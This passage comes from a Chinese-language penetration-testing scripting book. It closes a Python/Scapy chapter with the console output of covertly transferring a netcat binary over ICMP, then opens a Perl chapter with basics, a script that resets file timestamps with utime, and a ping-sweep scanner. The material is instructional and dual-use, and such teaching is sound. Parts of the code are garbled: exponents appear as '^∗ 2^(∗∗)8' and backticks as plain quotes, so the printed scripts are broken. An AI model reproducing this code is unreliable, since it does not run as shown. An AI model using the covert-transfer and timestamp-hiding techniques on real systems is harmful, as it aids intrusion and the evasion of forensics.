  \nData sent\n```\n\n我们使用 `sendICMP.py` 将文件发送到 192.168.1.1。我们看到文件已正确加载，并且所有数据都已发送。我们的嗅探器应该已经收到了所有数据包，现在我们应该有一个保存为\
  \ `mync` 的文件副本。让我们验证该文件是否与原始文件相同：\n\n```\nroot@bt:~# python receiveICMP.py mync\
  \ 192.168.1.1 690\n\nWARNING: No route found for IPv6 destination :: (no default\
  \ route?)\n\nsniffing with filter (icmp and host 192.168.1.1) for 690 bytes\n\n\
  Data Received\n\nroot@bt:~# ls -l /bin/nc.traditional mync\n\n-rwxr-xr-x 1 root\
  \ root 22076 Jun 21 2008 /bin/nc.traditional\n\n-rw-r--r-- 1 root root 22076 Mar\
  \ 27 16:53 mync\n\nroot@bt:~# md5sum /bin/nc.traditional mync\n\n781eb495b27a7aac194efe0b2a7c7c49\
  \ /bin/nc.traditional\n\n781eb495b27a7aac194efe0b2a7c7c49 mync\n```\n\n我们可以看到文件传输成功，并且当我们比较原始\
  \ Netcat 文件和新 Netcat 文件时，它们大小相同，`md5sum` 值也相同。我们的传输成功了。\n\n\n\n\n希望你现在已经对 Python\
  \ 和 Scapy 有了初步了解。我们构建了一些有用的工具，但仅仅触及了 Scapy 能力的皮毛。Scapy 可用于模糊测试、构建需要自定义数据包的漏洞利用程序，以及构建自动化嗅探工具。要了解更多信息，请访问\
  \ [www.secdev.org/projects/scapy/](http://www.secdev.org/projects/scapy/)。\n\n##\
  \ 总结\n\n我们涉及了 Python 在渗透测试中多个有用的领域。借助我们探索过的能力，你应该能够使用 Python 构建其他用于网络渗透测试的有用工具。现在你应具备足够的背景知识，能够理解其他\
  \ Python 模块文档，并利用这些模块创建新脚本。BackTrack Live 发行版中还包含其他 Python 程序，可以补充你的工具箱，或者在你希望扩展现有\
  \ Python 工具时作为参考。例如，Web 应用攻击与审计框架 w3af 以及用于恶意软件分析的工具 pyew 都是独立工具，而 Peach 模糊测试框架则可通过额外脚本帮助发现应用程序漏洞。\n\
  \n## 尾注\n\n1. 有关 Python 起源的更多信息，请参见 [www.tiobe.com/index.php/content/paperinfo/tpci/index.html](http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html)。\n\
  2. 部分安全工具列表可在 [`dirk-loss.de/python-tools.htm`](http://dirk-loss.de/python-tools.htm)\
  \ 找到。\n3. 关于 py2exe 的更多信息，请访问 [www.py2exe.org](http://www.py2exe.org/)。[`pypi.python.org/pypi/py2app/`](http://pypi.python.org/pypi/py2app/)\
  \ 和 [`cx-freeze.sourceforge.net/`](http://cx-freeze.sourceforge.net/) 分别提供了 py2app\
  \ 和 cx_freeze 的更多信息。\n\n# 第 3 章\n\n## Perl 入门\n\n## 本章内容：\n\n• Perl 的适用场景\n• 使用\
  \ Perl\n• Perl 基础\n• 综合运用\n\n本章我们将讨论脚本世界中经久不衰的常青树之一——Perl。Perl 理论上是一个缩写，根据交谈对象及其心情，它可能代表“实用提取与报告语言”[[1]](#CHP003.html_BIB1)，也可能代表“病态折衷的垃圾列表器”[[2]](#CHP003.html_BIB2)。Perl\
  \ 的座右铭是“不止一种方法能做到”，这指的是 Perl 非常松散和开放的结构。Perl 使我们能够创建从优雅整洁到故意混淆复杂的各种脚本。\n\n由于 Perl\
  \ 脚本具有可塑性，人们在查看 Perl 代码时常见的反应是极度困惑，试图解析代码在做什么——这种效果有时会被开发者故意放大。为了说明一些 Perl 开发者的特点，现已停刊的《Perl\
  \ 期刊》甚至连续几年举办了“Perl 混淆代码大赛”，主要目标是开发出最难以理解但功能正常的 Perl 代码。\n\n我们将讨论在渗透测试过程中 Perl 可能用于哪些方面。我们会介绍\
  \ Perl 语言的一些基础知识，并构建几个简单的工具来执行与渗透测试相关的任务。最后，我们将总结讨论，详细介绍如何用 Perl 组装一个简单网络管理协议（SNMP）扫描器，并讨论在渗透测试中如何使用它以及如何改进它。\n\
  \n## Perl 的适用场景\n\n如果我们看看 Perl 缩写的“官方”组成——实用提取与报告语言，就能开始理解 Perl 在哪些方面对我们有用。Perl\
  \ 最初的目标主要是开发一种改进的文本处理工具。随着时间的推移，Perl 演变成了“脚本语言的瑞士军刀”[[3]](#CHP003.html_BIB3)，现在广泛应用于从商业软件到大量自制黑客工具的各类应用中。总的来说，Perl\
  \ 是处理和操作数据的绝佳工具。\n\n### 处理文本\n\nPerl 最初的设计目的是简化从多种数据源生成报告的过程。尽管 Perl 已从这些卑微的起点发展壮大，但这类任务仍然是其功能集的核心。Perl\
  \ 是通用文本和数据操作的绝佳工具，这也是我们在渗透测试和安全活动中经常遇到的任务。\n\nPerl 是解析文本和模式匹配的绝佳工具。在渗透测试过程中，我们经常需要搜索目录及其包含的文件，查找特定的文本或文本模式。\n\
  \n例如，如果我们要在电子邮件日志中搜索不当暴露的个人身份信息（PII），可能需要一个工具来解析电子邮件消息以查找目标数据。使用 Perl，我们可以构建一个简单的脚本来解析此类消息的常见格式，并使用正则表达式（我们将在本章后面讨论）来搜索匹配敏感数据（如社会安全号码或支付卡号）的模式。事实上，由于\
  \ Perl 已经存在很长时间，并且经常用于此类任务，我们只需稍加搜索就可能找到现成的工具，并且可以简单地在脚本中使用现有代码或模块。\n\nPerl 也是操作文本的非常有用的工具。Perl\
  \ 复制了 sed 和 awk 等其他文本操作工具的许多特性和功能，并且如果发现 Perl 内部功能无法处理的任务，它还能将输出传递给操作系统中的外部命令。\n\
  \n### 粘合应用程序\n\nPerl 常被称为胶水语言。我们经常看到一些 Perl 代码示例，它们的存在仅仅是为了获取一个应用程序的输出，对该输出执行某些操作，然后将结果数据传递给另一个应用程序。我们可以使用这种技术将数据从一个工具迁移到另一个工具，处理工具之间不同的数据格式，创建包含来自多种来源（例如渗透测试报告中可能出现的）数据的报告，以及执行其他类似任务。\n\
  \n在渗透测试领域，我们经常遇到的一个情况是需要处理我们可能使用的不同工具产生的各种输出文件格式。在一次典型的渗透测试中，我们可能会使用 Nmap、Burp Suite、OpenVAS，以及\
  \ dig 和 whois 等命令行工具，还有自定义构建的工具。将数据从一个工具传递到另一个工具，或者将多个工具的数据编译成单一格式用于报告，这是非常常见的需求。\n\
  \n\n\n\n渗透测试中一个很好的例子可以在 `Nmap::Parser`^(1) Perl 模块中找到（我们将在本章后面更详细地讨论模块），该模块为我们提供了与\
  \ Nmap 扫描输出交互的接口。当我们可能想要执行 Nmap 扫描，然后检查扫描结果并根据这些结果执行其他活动时，这段 Perl 代码可以大大简化我们的任务。例如，如果我们想进行\
  \ Nmap 扫描，然后对任何在端口 80 或端口 443 上运行 Web 服务器的目标运行 Web 评估工具 Nikto，Perl 可以为我们提供一种简便的方法。我们当然可以自己编写代码来解析\
  \ Nmap 输出文件的格式，但任何优秀程序员和/或渗透测试人员的主要特质之一就是适当地运用懒惰。使用常见的脚本语言（如 Perl、Ruby 或 Python）来组合此类解决方案的一大好处是，我们可以在组装解决方案时站在巨人的肩膀上。\n\
  \n## 使用 Perl\n\nPerl 解释器有多种变体，每种变体又有多个版本。我们可能会遇到诸如 ActiveState Perl、^(2) Strawberry\
  \ Perl、^(3) 以及来自 [perl.org](http://perl.org) 的“官方”Perl 发行版^(4) 或其他许多发行版。只要使用相同的主要\
  \ Perl 版本并在相同类型的平台（Microsoft 与类 UNIX）上使用，这些 Perl 发行版在很大程度上会非常相似。此类 Perl 发行版通常会针对其预期运行的平台进行某种方式的调整，或者附带额外的实用程序，例如开发环境和类似的工具。\n\
  \n我们在本章示例中使用的 Perl 版本是 BackTrack 5 Linux 发行版自带的版本，即可以从 [www.perl.org](http://www.perl.org)\
  \ 下载的标准 Perl 5.10 版本。任何类似的 Perl 发行版也应该足够，但如果我们偏离太远，可能会开始遇到默认安装的软件包的问题。\n\n### 编辑工具\n\
  \n与本书中将要讨论的大多数脚本和脚本语言一样，我们在编辑工具的选择上相对自由。本章中的示例是使用 BackTrack 5 上的 Kate 编辑器构建的，正如我们在第\
  \ 1 章中讨论 shell 脚本时提到的那样。对于使用 Windows 操作系统的用户，有许多编辑器足以进行开发，包括真正出色的编辑器 Ultra Edit^(5)\
  \ 和 Kate 的 Windows 移植版，^(6) 如图 3.1 所示。\n\n![image](img/F000035f03-01-9781597497299.jpg)\n\
  \n图 3.1 Windows 上的 Kate\n\n### 扩展 Perl 脚本\n\nPerl 是许多事情的好工具，但与其他许多脚本语言一样，它受到其设计运行环境的限制。为了运行\
  \ Perl 脚本，我们需要在运行它的系统上有一个解释器，并且我们受限于命令行界面所能做的事情。对于这两个问题，就 Perl 脚本而言，我们可以稍微取巧来解决它们。\n\
  \n#### 编译 Perl 脚本\n\n正如我们到目前为止在本书中讨论的那样，解释型编程语言需要一个工具在运行时处理脚本，即解释器。如果我们处于一个没有解释器的机器上（这在渗透测试中并非不可能），我们就会遇到一点问题。幸运的是，这在某些脚本语言（包括\
  \ Perl）中是可以应对的。我们可以简单地编译我们的脚本。\n\n等等，我们不是刚刚讨论了 Perl 是一种解释型语言，按定义不会被编译吗？是的，我们确实这么说了。在这种情况下，我们可以做的事情并不是严格意义上的编译，但最终结果是相同的。有许多工具，包括\
  \ ActiveState 的 `PerlApp`^(7) 和 IndigoStar 的 `Perl2Exe`，^(8) 它们本质上会将一个小型的 Perl 解释器副本、我们的脚本以及任何其他依赖模块打包在一起，并为各种平台生成可执行二进制文件。当我们无法控制或更改所用系统的环境时，这是一种非常方便的能力。\n\
  \n### Perl 中的 GUI\n\n在绝大多数情况下，Perl 脚本用于生成命令行驱动的应用程序。然而，有时我们可能需要创建一个带有图形用户界面（GUI）的工具。例如，如果我们面对的是技术能力有限的用户，或者我们需要为现有工具添加界面，那么\
  \ GUI 可能正是我们所需要的。\n\n实际上，在 Perl 中有许多不同的库可以让我们访问此类功能。我们可以使用 `Perl/Tk` 来访问 Tk 小部件工具包，访问\
  \ GIMP 工具包（GTK+）的功能，或者许多其他库。使用此类工具的一个更方便的特性是，我们可以生成可在多个平台上使用的 GUI 驱动的 Perl 工具，而无需修改脚本的图形部分。\n\
  \n## Perl 基础\n\n在本节中，我们将介绍 Perl 使用的一些基本结构，包括变量、如何运行 shell 命令、如何使用模块扩展 Perl、参数、控制语句、文件输入输出以及正则表达式的使用。\n\
  \n### Hello World\n\n好了，我们来看看 Perl 中的标准 Hello World 脚本：\n\n```\n#!/usr/bin/perl\n\
  \nprint \"hello world!\\n\";\n```\n\n创建文件、设置可执行权限并通过发出诸如 `./helloworld.pl` 之类的命令运行脚本后，我们应该会看到类似于图\
  \ 3.2 所示的输出。\n\n![image](img/F000035f03-02-9781597497299.jpg)\n\n图 3.2 Hello World\
  \ 脚本及输出\n\n让我们来看看这个非常简单的脚本。我们从 shebang 开始，正如我们在第 1 章中讨论的那样。在这种情况下，我们通常可以在大多数类 UNIX\
  \ 系统上的 `/usr/bin/perl` 找到 Perl 解释器。如果不在那里，我们可以尝试使用 `whereis perl` 查找，或者手动检查其他常见目录，如\
  \ `/usr/local/bin`、`/bin` 或 `/opt/bin/`。如果所有方法都失败并且我们拥有系统的管理权限，我们可以使用 `find` 命令来查找它，例如发出\
  \ `find / -name perl –print`。\n\n提示\n\n那些眼尖的读者如果看了图 3.2，可能会指出我们将包含脚本的文件命名为 `helloworld.pl`。虽然在类\
  \ UNIX 系统上不需要也不一定使用 `.pl` 扩展名，但它确实可以提醒我们该脚本可能包含 Perl 代码，而无需打开它。关于这在类 UNIX 环境中是否有意义，存在不同意见，但在大多数情况下，这实际上是个人偏好问题。\n\
  \n在脚本的第二行，我们简单地打印了一个字符串。其中有一些奇怪的部分可能对之前没有接触过 Perl 的人来说不熟悉。第一个是我们要输出的字符串末尾的 `\\n`。`\\\
  n` 表示我们在字符串末尾插入了一个换行符。在 Perl 中，我们可以使用许多类似的字符组合。表 3.1 列出了几个常用的组合。\n\n表 3.1 Perl 中的特殊字符\n\
  \n| 字符 | 行为 |\n| --- | --- |\n| `\\a` | 响铃 |\n| `\\b` | 退格 |\n| `\\e` | ESC |\n\
  | `\\f` | 换页 |\n| `\\n` | 换行 |\n| `\\r` | 回车 |\n| `\\t` | 制表符 |\n\n\n\n\n我们可能还会注意到，脚本的输出行以分号结尾。在\
  \ Perl 中，除了少数特殊情况外，每条语句都需要以分号结尾。注意，这里说的是“语句”，而不是“行”。我们也可以在一行中写多条语句，或者写一条跨多行的语句。在某些情况下，即使不加分号也能运行，但为了保持一致性，通常加上分号会更稳妥。\n\
  \n### 变量\n\n当然，Perl 也提供了多种数据结构来存储内容，其中最常见的是标量变量。在 Perl 中，无论是修改内容还是仅仅读取内容，变量前都要加上\
  \ `$`。我们可以用变量来存储和操作各种内容，而无需事先声明其类型（例如字符串或整数）。下面这个简单脚本展示了变量的用法：\n\n```\n#!/usr/bin/perl\n\
  \nprint \"Hi. What is your name?\\n\";\n\n$name = <STDIN>; #take in a name\n\nchomp\
  \ $name;\n\nprint \"$name is a nice name\\n\";\n```\n\n这里我们使用了一个变量，还用到了一些新东西，下面逐一说明。第一行照例是\
  \ shebang，以便使用正确的解释器。第二行输出一个字符串来询问姓名。下一行定义了变量 `$name`，并等待从标准输入 `<STDIN>` 获取输入——也就是脚本运行时我们输入内容的控制台。这样，我们在控制台输入的内容（直到按下\
  \ `Enter` 键）就会被存入该变量。注意行末以井号 `#` 开头的注释，它防止该行剩余部分在脚本运行时被解释。\n\n下一行使用了 `chomp`，这是一个非常方便的\
  \ Perl 函数。当我们从 `<STDIN>` 获取输入时，按下 `Enter` 键会结束输入。Enter 键代表的换行符（也称为 `\\n`）也会被存入变量，如果不处理掉，它就会出现在最后的输出语句中，而\
  \ `chomp` 的作用正是去除这个换行符。`chomp` 专门针对换行符，我们也可以使用 `chop`，它会去掉最后一个字符，无论它是什么。\n\n脚本的最后一行输出一句赞美，并使用了存储在\
  \ `$name` 中的数据。\n\n### Shell 命令\n\n另一个有趣且非常实用的工具是执行 shell 命令的能力，这与我们在第 1 章 中 bash\
  \ 脚本的做法非常相似。我们将看看如何执行 shell 命令，以及如何使用 Perl 操作文件的时间戳。\n\n```\n#!/usr/bin/perl\n\n\
  $file = \"testfile\";\n\n'touch $file';\n\n$origaccessed = (stat($file))[8];\n\n\
  $origmodified = (stat($file))[9];\n\nprint \"original accessed = $origaccessed\\\
  n\";\n\nprint \"original modified = $origmodified\\n\";\n\nsleep(5);\n\n'touch $file';\n\
  \n$newaccessed = (stat($file))[8];\n\n$newmodified = (stat($file))[9];\n\nprint\
  \ \"new accessed = $newaccessed\\n\";\n\nprint \"new modified = $newmodified\\n\"\
  ;\n\nutime $origaccessed, $origmodified, $file;\n\n$finalaccessed = (stat($file))[8];\n\
  \n$finalmodified = (stat($file))[9];\n\nprint \"final accessed = $finalaccessed\\\
  n\";\n\nprint \"final modified = $finalmodified\\n\";\n```\n\n当然，我们从 shebang 开始。然后设置一个变量\
  \ `$file`，并将字符串 `testfile` 存入其中，这就是脚本中要操作的文件名。第二行使用了反引号，就像我们在第 1 章 的 bash 中做的那样。这里，反引号包围了\
  \ Linux 命令 `touch`，它会更新 `$file` 中存储的文件名的时间戳，如果文件不存在，还会创建它。\n\n接下来，我们复制文件中已有的时间戳。我们使用\
  \ Perl 内置的 `stat` 命令来完成。`stat` 命令会返回关于文件的相当多的信息^(9)，包括我们感兴趣的时间戳。我们可以像处理数组一样处理 `stat`\
  \ 命令，以访问我们感兴趣的特定元素。例如，这里我们使用 `(stat($file)[8])` 来访问第八个元素，即文件的访问时间戳。类似地，我们访问第九个元素来获取修改时间。对于每一项，我们将\
  \ `stat` 的结果分别存入变量 `$origaccessed` 和 `$origmodified`。然后输出这两个变量的内容，以显示文件的初始时间戳。\n\
  \n注意\n\n`stat` 返回的时间戳是以自纪元以来的秒数表示的。这是一种花哨的说法，意思是“自 1970 年 1 月 1 日 00:00:00 UTC 以来经过的秒数”。[[4]](#CHP003.html_BIB4)\
  \ 我们将在本节后面讨论如何将这些时间戳转换为人类可读的时间。\n\n记录并输出初始时间戳后，我们使用 `sleep` 命令等待五秒，然后再次执行 `touch`\
  \ 命令来更新文件的时间戳。使用 `sleep` 命令是为了让脚本后续部分的时间戳差异更明显一些。\n\n接下来，我们再次使用 `stat` 从文件中获取更新后的时间戳，将其存入变量，并再次显示。我们会看到时间戳略有变化，这主要是因为我们使用了\
  \ `sleep` 造成了短暂延迟。\n\n由于我们记录了文件的原始时间戳，可以使用 `utime` 命令将修改后的时间戳重置为原始值。`utime` 命令使用非常简单，只需将记录在\
  \ `$origaccessed` 和 `$origmodified` 中的原始时间戳数据直接传给 `utime` 即可。具体来说，我们使用 `utime $origaccessed,\
  \ $origmodified, $file`。然后再次获取并显示时间戳，结果应该会看到原始时间戳，如图 3.3 所示。\n\n![image](img/F000035f03-03-9781597497299.jpg)\n\
  \n图 3.3 时间戳脚本输出\n\n我们可以做一些改进，让这个脚本更好用。比如，将时间戳转换为更易读的格式，或者使用函数来避免重复编写获取和打印时间戳的代码。\n\
  \n```\n#!/usr/bin/perl\n\n$file = \"testfile\";\n\n'touch $file';\n\nprint \"original\
  \ timestamps\\n\";\n\n($origaccessed, $origmodified) = get_timestamps($file);\n\n\
  sleep(5);\n\n'touch $file';\n\nprint \"modified timestamps\\n\";\n\nget_timestamps($file);\n\
  \nutime $origaccessed, $origmodified, $file;\n\nprint \"final timestamps\\n\";\n\
  \nget_timestamps($file);\n\nsub get_timestamps\n\n{\n\n$timestampfile = @_[0];\n\
  \n@timestamps[0] = (stat($timestampfile))[8];\n\n@timestamps[1] = (stat($timestampfile))[9];\n\
  \nprint \"accessed = \", scalar localtime(@timestamps[0]),\"\\n\";\n\nprint \"modified\
  \ = \", scalar localtime(@timestamps[1]),\"\\n\";\n\nreturn @timestamps;\n\n}\n\
  ```\n\n虽然看起来变化很大，但本质上还是同一个脚本。末尾新增了一个函数，其中包含了获取并打印访问时间和修改时间的代码，这也是改动最大的部分。我们先快速看一下第\
  \ 5 行，这里调用了函数 `($origaccessed, $origmodified) = get_timestamps($file);`。这一行做了两件事：调用名为\
  \ `get_timestamps` 的函数，并将变量 `$file` 的内容（即文件名）传递给它；同时，将函数调用产生的输出存入变量 `$origaccessed`\
  \ 和 `$origmodified`。\n\n\n\n让我们快速看一下这个函数。在 Perl 中，函数以 `sub` 开头，然后是函数名和花括号 `{}`，用于包含函数的内容。这里，我们的函数名为\
  \ `get_timestamps`。函数内部的第一行 `$timestampfile = @_[0]` 看起来可能有点奇怪。在 Perl 中，`@_` 是保存参数的数组。在这里，我们用参数数组的第一个元素的内容填充了变量\
  \ `$timestampfile`，即调用该函数时传入的文件名。在脚本的第 9 行和第 12 行，我们还可以看到同一个函数以略有不同的方式被调用，如 `get_timestamps($file);`。在这些情况下，我们不需要将返回结果存储在变量中，因此我们只是调用该函数来打印文件的当前时间戳。\n\
  \n### 参数\n\n虽然我们已经简要讨论了函数内参数的使用，但还没有谈到如何在脚本运行时使用它们来传递参数。对于我们一直在开发的时间戳工具，能够从命令行传递文件名，而不是将文件名硬编码到脚本中，可能会很方便。让我们看看如何做到这一点。\n\
  \n在从命令行传递参数的情况下，Perl 再次使用一个数组来保存它们，称为 `@ARGV`。修改我们的时间戳脚本以利用这一点是一项简单的任务。在脚本的第 2 行，目前是\
  \ `$file = \"testfile\";`，我们只需将其改为 `$file = @ARGV[0];`。脚本的其余部分保持不变，但执行时我们需要提供一个文件名，例如\
  \ `./timestamps3.pl testfile2`。\n\n警告\n\n在 Perl 中，数组的元素通常通过将其作为标量变量并以 `$` 开头来正确访问，例如\
  \ `$array[0]` 用于访问 `@array` 的第一个元素。在大多数情况下，像本章中那样使用 `@array[0]` 来访问元素是可行的，但偶尔可能会以奇怪且不可预测的方式失败。如果我们稍加搜索，会发现两种方法都有支持者，但我们应该了解使用数组的“正确”方式。\n\
  \n正如我们将在本书中看到的其他几种脚本语言一样，`@ARGV` 数组将按顺序包含在命令行中传递的参数，每个元素一个参数。因此，如果我们想向脚本传递多个文件名，我们会从\
  \ `@ARGV[0]` 中查找第一个，从 `@ARGV[1]` 中查找第二个，依此类推。当然，我们还需要稍微修改脚本以处理多个文件。\n\n### 控制语句\n\
  \n现在我们将处理在 Perl 中使用控制语句。我们将介绍如何利用条件语句在 Perl 脚本中做出决策，以及如何利用各种可用的循环。在此过程中，我们将构建一个端口扫描器，作为本章最终项目的基础。\n\
  \n#### 条件语句\n\nPerl 中的主要条件语句围绕 `if` 语句展开。Perl 中的 `if` 语句结构如下：\n\n```\nif (condition){\n\
  \n#execute code\n\n}else{\n\n#execute different code\n\n}\n```\n\n让我们快速用这个结构写点东西：\n\
  \n```\n#!/usr/bin/perl\n\nuse Net::Ping;\n\n$host = \"10.0.0.1\";\n\n$pinger = Net::Ping->new(\"\
  icmp\", 1, 64);\n\nif ($pinger->ping($host)) {\n\nprint \"$host is up\\n\";\n\n\
  } else {\n\nprint \"$host is down\\n\";\n\n}\n```\n\n这里有一些新内容，还有一些在看过第 1 章的 shell\
  \ 脚本后应该相对熟悉了。\n\n第 1 行当然是我们的 shebang，指向正确的解释器。接下来是 `use Net::Ping;`。这是我们第一次接触 Perl\
  \ 中的模块，所以我们将简要讨论一下。Perl 模块是一段自包含的 Perl 代码，通常用于实现某些特定目的。我们在这里使用的模块 `Net::Ping` 专门用于执行\
  \ ping 功能。我们可以将 Perl 模块视为函数概念的扩展。我们使用函数是为了避免重复编写相同的代码，并将其放在一边。Perl 模块基于大致相同的概念，只是规模通常更大。我们使用\
  \ `use` 语句加上模块名称来使用模块，就像之前包含 `Net::Ping` 的那一行一样，其中 `Net::Ping` 是模块名称。\n\n接下来，我们设置变量\
  \ `$host`，为其分配一个 IP 地址，以便提供给我们的 ping 模块，然后设置实际执行 ping 操作的行。在这里，我们将要使用的 ping 对象称为\
  \ `$pinger`，并告诉它创建该对象的一个新实例，并且我们要发送一个互联网控制消息协议（ICMP）ping。\n\n然后我们设置一个 `if` 语句，尝试\
  \ ping `$host` 中的值，其条件取决于是否返回错误。如果没有返回错误，我们输出一条表示成功的消息；如果确实看到错误，我们输出一条表示失败的消息。代码非常简单，但可以很好地\
  \ ping 一个主机，如图 3.4 所示。\n\n![image](img/F000035f03-04-9781597497299.jpg)\n\n图 3.4\
  \ If 脚本输出\n\n接下来，我们将考虑添加一些循环，使我们的脚本更有用。\n\n#### 循环\n\nPerl 中的循环与我们讨论的条件语句类似，与我们在第\
  \ 1 章中构建 bash shell 脚本时看到的情况相似。我们最常用的循环 `for` 循环的基本结构是：\n\n```\nfor (starting value;test;alter\
  \ value){\n\n#code goes here\n\n}\n```\n\n因此，如果我们想做一些简单的事情，比如数到 10，我们可以设置一个类似这样的循环：\n\
  \n```\n#!/usr/bin/perl\n\nfor($counter=1;$counter<=10;$counter++){\n\nprint \"the\
  \ counter is \", $counter, \"\\n\";\n\n}\n```\n\n为了设置这里的 `for` 循环，我们将变量 `$counter`\
  \ 设置为 1，表示循环的起始位置。然后我们设置测试条件，检查 `$counter` 中存储的值是否小于或等于 10。最后，我们使用 `$counter++`\
  \ 将计数器变量中的值增加 1。\n\n让我们将本章前面编写的 ping 代码变得更实用一些。我们可以使用一点循环，将单次 ping 工具变成 ping 扫描工具。由于我们需要一些技巧来正确递增\
  \ IP 地址，代码会很快变得复杂，但请坚持住，我们将逐步讲解脚本并解释所有内容。\n\n```\n#!/usr/bin/perl\n\nuse Net::Ping;\n\
  \n$ip1 = @ARGV[0];\n\n$ip2 = @ARGV[1];\n\n$rawip1 = get_raw_address($ip1);\n\n$rawip2\
  \ = get_raw_address($ip2);\n\nfor ($counter = $rawip1;$counter<=$rawip2;$counter++){\n\
  \n   $host = get_ip_address($counter);\n\n   $pinger = Net::Ping->new(\"icmp\",\
  \ 1, 64);\n\n   if ($pinger->ping($host)) {\n\n   print \"$host is up\\n\";\n\n\
  \   } else {\n\n   print \"$host is down\\n\";\n\n   }\n\n}\n\n###### get_raw_address\
  \ ######\n\n#get the raw version of an IP\n\nsub get_raw_address {\n\n   my $ipaddress;\n\
  \n   my $oct1;\n\n   my $oct2;\n\n   my $oct3;\n\n   my $oct4;\n\n   my $retval;\n\
  \n   $ipaddress = shift;\n\n   ($oct1, $oct2, $oct3, $oct4) = split /\\./, $ipaddress;\n\
  \n   $retval = $oct4 + ($oct3 ^∗ 2^(∗∗)8) + ($oct2 ^∗ 2^(∗∗)16) + ($oct1 ^∗ 2^(∗∗)24);\n\
  \n   return $retval;\n\n}\n\n###### get_ip_address ########\n\n#get the regular\
  \ version of an IP\n\nsub get_ip_address {\n\n   my $rawaddress;\n\n   my $retval;\n\
  \n   my $oct;\n\n   my $counter;\n\n   $rawaddress = shift;\n\n   while ($counter<4){\n\
  \n     $oct = $rawaddress % 2^(∗∗)8; #get the rightmost 8 bits\n\n     $retval =\
  \ $oct . \".\" . $retval;\n\n     $rawaddress = int($rawaddress / 2^(∗∗)8); #get\
  \ the next 8 bits\n\n     $counter++;\n\n   }\n\n   chop $retval;\n\n   if ($retval\
  \ =~ m/\\.(255 |0)$/) { # skip 0 & 255 addresses\n\n     return 0;\n\n   }\n\n \
  \  print \"retval = \", $retval, \"\\n\";\n\n   return $retval;\n\n}\n```\n\n我们从与之前相同的\
  \ shebang 和加载 `Net::Ping` 模块的 `use` 语句开始。然后我们从 `@ARGV` 数组中获取起始和结束 IP，并将它们放入 `$ip1`\
  \ 和 `$ip2` 中。\n\n\n\n\n接下来，我们需要做一些工作，将 IP 地址转换成我们可以处理的格式，以便能够以合理的方式递增它们。IP 地址的格式为\
  \ `###.###.###.###`，每个八位组范围从 0 到 255，从一个 IP 移动到下一个 IP 需要相当多的操作，尤其是在大范围内，因此我们只需改变数字格式。为此，我们将\
  \ `$ip1` 和 `$ip2` 中的 IP 地址传递给 `get_raw_address` 函数，并将结果放入 `$rawip1` 和 `$rawip2`，在需要从一个\
  \ IP 移动到下一个 IP 时，以原始形式处理这些 IP。\n\n在 `get_raw_address` 函数中，我们设置了一些变量来保存传入的 IP 地址、组成\
  \ IP 的各个八位组以及我们将返回的原始值。注意，我们在变量前使用了 `my`，这使它们成为函数内部的局部变量。这将避免我们与 `$retval` 变量产生问题，该变量也在另一个函数中使用。\n\
  \n`$ipaddress = shift;` 这行代码是 Perl 的一个小技巧。`shift` 命令通常用于移除数组的第一个元素，并将数组的其余元素向前移动一位，从而使整个数组缩短一个元素。如果在使用\
  \ `shift` 时没有提供数组，则假定我们指的是 `@ARGV`（如果我们在脚本的主部分工作）或 `@_`（如果我们在函数中）。因此，本质上，仅使用 `shift`\
  \ 本身就可以访问我们的参数数组，从数组的第一个元素开始，每次调用时取出下一个元素。在这种情况下，我们将调用函数时传递的参数取出并放入 `$ipaddress`。\n\
  \n接下来，我们在 `$ipaddress` 中的八位组之间的点处拆分该值，并将每个八位组放入 `$oct1`、`$oct2`、`$oct3` 和 `$oct4`。然后，我们进行一些数学处理（`^`\
  \ 在 Perl 中表示指数），将 IP 的八位组转换为十进制，并将它们合并成一个易于递增的数字，然后将结果放入 `$retval`。\n\n完成所有这些后，我们返回结果，该结果将被放入我们最初调用函数时的\
  \ `$rawip1` 和 `$rawip2` 变量中。呼，对于一个看似简单的事情来说，这工作量可真不小。如果我们快速查看一下 `$retval` 或 `$rawip`\
  \ 变量（我们可以在代码中直接打印它们），我们会看到一个像 `10.0.0.1` 这样的 IP 地址被渲染成 `167772161` 这样的数字，为了递增的目的，我们可以更容易地处理它。\n\
  \n回到脚本的主体部分，我们现在设置 `for` 循环来运行 ping 扫描：`for ($counter = $rawip1;$counter<=$rawip2;$counter++)`。这里我们将\
  \ `$counter` 变量设置为起始 IP 地址的原始形式。然后检查 `$counter` 是否小于或等于表示范围结束的 IP；如果是，则继续，否则停止。如果继续，我们将\
  \ `$counter` 增加 1。\n\n在 `for` 循环内部，大部分内容与脚本的先前版本相同，只有一个例外。现在我们已经将 IP 地址转换为数字格式，这对于\
  \ ping 的目的来说用处不大，因此我们需要将其恢复为正常的 IP 格式，以便在此处使用。在 `for` 循环的第一行中，我们调用 `get_ip_address`\
  \ 函数，并将 `$counter` 的值传递给它。\n\n在 `get_ip_address` 函数内部，我们基本上执行与 `get_raw_address`\
  \ 函数相反的操作。我们首先在函数顶部定义几个变量。注意，这里我们再次使用了 `$counter` 变量，该变量在脚本的其他地方也有使用。这在这里不是问题，因为我们使用\
  \ `my` 关键字创建了该变量，使其作用域局限于函数内部。接下来，我们将参数移入函数，从 `@_`（参数数组）中取出，因为我们没有另行指定。\n\n然后我们处理一个\
  \ `while` 循环。以这种方式构建的 `while` 循环的工作方式与 `for` 循环基本相同，但结构略有不同。`for` 循环通常按一定次数执行其循环，而\
  \ `while` 循环则一直执行直到其条件测试为假。在这种情况下，我们检查 `$counter` 是否小于 4，并在循环内使用 `$counter++` 递增它。这将导致循环执行四次，每次对应我们将重建的\
  \ IP 地址中的一个八位组。\n\n在循环内部，我们取出 `$rawaddress` 的内容，每次从右侧取出八位，将其转换回正确的表示法，并放入 `$oct`。每次循环，我们将八位组放入\
  \ `$retval`，并添加适当的点来分隔 IP。\n\n循环结束后，IP 末尾会多出一个点，因此我们使用 `chop` 将其移除。正如本章前面讨论的，`chop`\
  \ 会移除字符串的最后一个字符，无论它是什么。函数完成后，我们将 `$retval` 发送回脚本主体中的 `for` 循环，并继续循环直到达到 IP 范围的末尾。我们应该得到类似图\
  \ 3.5 的输出。\n\n![image](img/F000035f03-05-9781597497299.jpg)\n\n图 3.5 Ping 扫描脚本输出\n\
  \n就是这样。现在我们有了一个不错的 ping 扫描器，可以用作构建其他东西的基础，或者直接使用。我们最终将把它用作本章末尾构建的 SNMP 扫描器的基础。\n\
  \n### 正则表达式\n\n正则表达式，也称为 regex，是我们在 Perl 中处理文本时可以使用的一个非常方便的工具。我们可以使用正则表达式搜索文本中的常见模式，例如\
